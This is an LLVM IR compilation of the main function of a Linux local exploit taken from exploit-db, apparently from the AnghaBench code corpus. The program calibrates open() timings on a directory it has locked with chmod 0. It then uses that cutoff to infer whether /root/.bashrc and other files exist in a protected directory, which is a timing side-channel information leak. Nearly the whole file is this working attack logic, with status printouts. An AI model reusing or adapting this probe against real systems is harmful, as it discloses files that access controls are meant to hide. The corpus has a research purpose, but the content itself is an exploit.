; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22458.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22458.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32 }

@cleanup = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [26 x i8] c"[+] creating unreachable\0A\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"unreachable\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"\09[-] Unable to create unreachable\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [33 x i8] c"[+] creating unreachable/iexist\0A\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"unreachable/iexist\00", align 1
@.str.5 = private unnamed_addr constant [42 x i8] c"\09[-] Unable to create unreachable/iexist\0A\00", align 1
@.str.6 = private unnamed_addr constant [29 x i8] c"[+] chmod 0'ing unreachable\0A\00", align 1
@.str.7 = private unnamed_addr constant [34 x i8] c"\09[-] Unable to chmod unreachable\0A\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"[+] \00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [27 x i8] c"ls -alF | grep unreachable\00", align 1
@.str.10 = private unnamed_addr constant [41 x i8] c"[+] Timing open() on unreachable/iexist\0A\00", align 1
@.str.11 = private unnamed_addr constant [19 x i8] c"unreachable/exists\00", align 1
@flags = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [36 x i8] c"\09[+] Successful: %ld usecs, got %m\0A\00", align 1
@.str.13 = private unnamed_addr constant [47 x i8] c"[+] Timing open() on unreachable/non-existant\0A\00", align 1
@.str.14 = private unnamed_addr constant [25 x i8] c"unreachable/non-existant\00", align 1
@.str.15 = private unnamed_addr constant [33 x i8] c"\09[+] Failure: %ld usecs, got %m\0A\00", align 1
@.str.16 = private unnamed_addr constant [68 x i8] c"[-] It appears the load went up unexpectadly, mebe try re-running?\0A\00", align 1
@.str.17 = private unnamed_addr constant [30 x i8] c"\09[+] Using %d as our cutoff.\0A\00", align 1
@.str.18 = private unnamed_addr constant [50 x i8] c"[+] testing /root/.bashrc and /root/non-existant\0A\00", align 1
@.str.19 = private unnamed_addr constant [14 x i8] c"/root/.bashrc\00", align 1
@.str.20 = private unnamed_addr constant [46 x i8] c"\09[+] /root/.bashrc exists (%d usecs), got %m\0A\00", align 1
@.str.21 = private unnamed_addr constant [53 x i8] c"\09[+] /root/.bashrc doesn't exist (%d usecs), got %m\0A\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"/root/non-existant\00", align 1
@.str.23 = private unnamed_addr constant [51 x i8] c"\09[+] /root/non-existant exists (%d usecs), got %m\0A\00", align 1
@.str.24 = private unnamed_addr constant [58 x i8] c"\09[+] /root/non-existant doesn't exist (%d usecs), got %m\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.timeval, align 4
  %7 = alloca %struct.timeval, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [500 x i8], align 16
  %11 = alloca [500 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @cleanup, align 4
  %16 = call i32 @atexit(i32 %15)
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0))
  %18 = call i32 @mkdir(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32 448)
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %24

20:                                               ; preds = %2
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  %22 = load i32, i32* @EXIT_FAILURE, align 4
  %23 = call i32 @exit(i32 %22) #3
  unreachable

24:                                               ; preds = %2
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  %26 = call i32 @creat(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0), i32 448)
  store i32 %26, i32* %8, align 4
  %27 = icmp eq i32 %26, -1
  br i1 %27, label %28, label %32

28:                                               ; preds = %24
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.5, i64 0, i64 0))
  %30 = load i32, i32* @EXIT_FAILURE, align 4
  %31 = call i32 @exit(i32 %30) #3
  unreachable

32:                                               ; preds = %24
  %33 = load i32, i32* %8, align 4
  %34 = call i32 @close(i32 %33)
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.6, i64 0, i64 0))
  %36 = call i32 @chmod(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32 0)
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

38:                                               ; preds = %32
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.7, i64 0, i64 0))
  %40 = load i32, i32* @EXIT_FAILURE, align 4
  %41 = call i32 @exit(i32 %40) #3
  unreachable

42:                                               ; preds = %32
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0))
  %44 = load i32, i32* @stdout, align 4
  %45 = call i32 @fflush(i32 %44)
  %46 = call i32 @system(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0))
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.10, i64 0, i64 0))
  %48 = call i32 @gettimeofday(%struct.timeval* %6, i32* null)
  %49 = load i32, i32* @flags, align 4
  %50 = call i32 @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.11, i64 0, i64 0), i32 %49)
  store i32 %50, i32* %8, align 4
  %51 = call i32 @gettimeofday(%struct.timeval* %7, i32* null)
  %52 = call i32 @tv_diff(%struct.timeval* %7, %struct.timeval* %6)
  store i32 %52, i32* %12, align 4
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.12, i64 0, i64 0), i32 %52)
  %54 = load i32, i32* %8, align 4
  %55 = call i32 @close(i32 %54)
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.13, i64 0, i64 0))
  %57 = call i32 @gettimeofday(%struct.timeval* %6, i32* null)
  %58 = load i32, i32* @flags, align 4
  %59 = call i32 @open(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.14, i64 0, i64 0), i32 %58)
  store i32 %59, i32* %9, align 4
  %60 = call i32 @gettimeofday(%struct.timeval* %7, i32* null)
  %61 = call i32 @tv_diff(%struct.timeval* %7, %struct.timeval* %6)
  store i32 %61, i32* %14, align 4
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.15, i64 0, i64 0), i32 %61)
  %63 = load i32, i32* %9, align 4
  %64 = call i32 @close(i32 %63)
  %65 = call i32 @tv_diff(%struct.timeval* %7, %struct.timeval* %6)
  %66 = load i32, i32* %12, align 4
  %67 = add i32 %66, %65
  store i32 %67, i32* %12, align 4
  %68 = load i32, i32* %12, align 4
  %69 = udiv i32 %68, 3
  store i32 %69, i32* %12, align 4
  %70 = load i32, i32* %14, align 4
  %71 = load i32, i32* %12, align 4
  %72 = icmp ugt i32 %70, %71
  br i1 %72, label %78, label %73

73:                                               ; preds = %42
  %74 = load i32, i32* %12, align 4
  %75 = load i32, i32* %14, align 4
  %76 = mul i32 %75, 8
  %77 = icmp ugt i32 %74, %76
  br i1 %77, label %78, label %82

78:                                               ; preds = %73, %42
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.16, i64 0, i64 0))
  %80 = load i32, i32* @EXIT_FAILURE, align 4
  %81 = call i32 @exit(i32 %80) #3
  unreachable

82:                                               ; preds = %73
  %83 = load i32, i32* %14, align 4
  %84 = mul i32 %83, 4
  %85 = load i32, i32* %12, align 4
  %86 = icmp uge i32 %84, %85
  br i1 %86, label %87, label %90

87:                                               ; preds = %82
  %88 = load i32, i32* %12, align 4
  %89 = add i32 %88, -1
  store i32 %89, i32* %12, align 4
  br label %90

90:                                               ; preds = %87, %82
  %91 = load i32, i32* %12, align 4
  %92 = load i32, i32* %14, align 4
  %93 = mul i32 %92, 3
  %94 = icmp ule i32 %91, %93
  br i1 %94, label %95, label %98

95:                                               ; preds = %90
  %96 = load i32, i32* %12, align 4
  %97 = add i32 %96, 1
  store i32 %97, i32* %12, align 4
  br label %98

98:                                               ; preds = %95, %90
  %99 = load i32, i32* %12, align 4
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.17, i64 0, i64 0), i32 %99)
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.18, i64 0, i64 0))
  %102 = call i32 @gettimeofday(%struct.timeval* %6, i32* null)
  %103 = load i32, i32* @flags, align 4
  %104 = call i32 @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i64 0, i64 0), i32 %103)
  store i32 %104, i32* %8, align 4
  %105 = call i32 @gettimeofday(%struct.timeval* %7, i32* null)
  %106 = call i32 @tv_diff(%struct.timeval* %7, %struct.timeval* %6)
  store i32 %106, i32* %13, align 4
  %107 = load i32, i32* %12, align 4
  %108 = icmp uge i32 %106, %107
  br i1 %108, label %109, label %112

109:                                              ; preds = %98
  %110 = load i32, i32* %13, align 4
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.20, i64 0, i64 0), i32 %110)
  br label %115

112:                                              ; preds = %98
  %113 = load i32, i32* %13, align 4
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.21, i64 0, i64 0), i32 %113)
  br label %115

115:                                              ; preds = %112, %109
  %116 = load i32, i32* %8, align 4
  %117 = call i32 @close(i32 %116)
  %118 = call i32 @gettimeofday(%struct.timeval* %6, i32* null)
  %119 = load i32, i32* @flags, align 4
  %120 = call i32 @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i64 0, i64 0), i32 %119)
  store i32 %120, i32* %9, align 4
  %121 = call i32 @gettimeofday(%struct.timeval* %7, i32* null)
  %122 = call i32 @tv_diff(%struct.timeval* %7, %struct.timeval* %6)
  store i32 %122, i32* %13, align 4
  %123 = load i32, i32* %12, align 4
  %124 = icmp uge i32 %122, %123
  br i1 %124, label %125, label %128

125:                                              ; preds = %115
  %126 = load i32, i32* %13, align 4
  %127 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.23, i64 0, i64 0), i32 %126)
  br label %131

128:                                              ; preds = %115
  %129 = load i32, i32* %13, align 4
  %130 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.24, i64 0, i64 0), i32 %129)
  br label %131

131:                                              ; preds = %128, %125
  %132 = load i32, i32* %9, align 4
  %133 = call i32 @close(i32 %132)
  %134 = load i32, i32* %3, align 4
  ret i32 %134
}

declare dso_local i32 @atexit(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @mkdir(i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @creat(i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @chmod(i8*, i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @gettimeofday(%struct.timeval*, i32*) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @tv_diff(%struct.timeval*, %struct.timeval*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
